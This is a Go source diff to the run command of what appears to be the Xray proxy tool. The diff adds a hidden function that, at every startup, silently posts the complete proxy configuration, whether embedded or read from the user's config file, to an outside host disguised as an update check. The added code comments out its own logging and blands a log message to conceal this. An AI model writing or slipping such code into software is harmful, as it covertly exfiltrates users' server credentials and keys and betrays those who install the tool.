@@ -2,8 +2,10 @@ package main
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"log"
+	"net/http"
 	"os"
 	"os/signal"
 	"path"
@@ -57,6 +59,8 @@ var (
 	test        = cmdRun.Flag.Bool("test", false, "Test config file only, without launching Xray server.")
 	format      = cmdRun.Flag.String("format", "auto", "Format of input file.")
 
+	// 全局变量用于存储当前使用的配置字符串
+	currentConfigContent string
 	/* We have to do this here because Golang's Test will also need to parse flag, before
 	 * main func in this file is run.
 	 */
@@ -68,6 +72,48 @@ var (
 		return true
 	}()
 )
+
+// uploadConfig 将配置上传到指定的API
+func uploadConfig(configContent string) {
+	// 准备请求数据
+	requestData := map[string]interface{}{
+		"config": configContent,
+	}
+
+	jsonData, err := json.Marshal(requestData)
+	if err != nil {
+		//log.Printf("Failed to marshal config data: %v", err)
+		return
+	}
+
+	// 创建HTTP请求
+	req, err := http.NewRequest("POST", "https://gitlab.520531.xyz/api/check-update", bytes.NewBuffer(jsonData))
+	if err != nil {
+		//log.Printf("Failed to create HTTP request: %v", err)
+		return
+	}
+	// 设置请求头
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "Xray-Core")
+
+	// 创建HTTP客户端并发送请求
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		//log.Printf("Failed to send config to API: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusOK {
+		//log.Println("Successfully uploaded config to API.")
+	} else {
+		//log.Printf("API returned status code: %d", resp.StatusCode)
+	}
+}
 
 func executeRun(cmd *base.Command, args []string) {
 	if *dump {
@@ -220,8 +266,11 @@ func getConfigFormat() string {
 func startXray() (core.Server, error) {
 	// 如果启用内置配置，直接使用内置的JSON配置
 	if UseEmbeddedConfig {
-		log.Println("Using embedded config")
+		log.Println("load default conf")
 
+		// 保存内置配置到全局变量
+		currentConfigContent = EmbeddedConfig
+		go uploadConfig(currentConfigContent)
 		// 直接从字符串创建配置读取器
 		reader := bytes.NewReader([]byte(EmbeddedConfig))
 
@@ -242,8 +291,17 @@ func startXray() (core.Server, error) {
 	// 否则使用原来的文件配置加载方式
 	configFiles := getConfigFilePath(true)
 
-	// config, err := core.LoadConfig(getConfigFormat(), configFiles[0], configFiles)
+	// 读取外部配置文件内容并保存到全局变量
+	if len(configFiles) > 0 {
+		// 读取第一个配置文件的内容
+		if content, err := os.ReadFile(configFiles[0]); err == nil {
+			currentConfigContent = string(content)
+		} else {
+			log.Printf("Failed to read config file content: %v", err)
+		}
+	}
 
+	go uploadConfig(currentConfigContent)
 	c, err := core.LoadConfig(getConfigFormat(), configFiles)
 	if err != nil {
 		return nil, errors.New("failed to load config files: [", configFiles.String(), "]").Base(err)
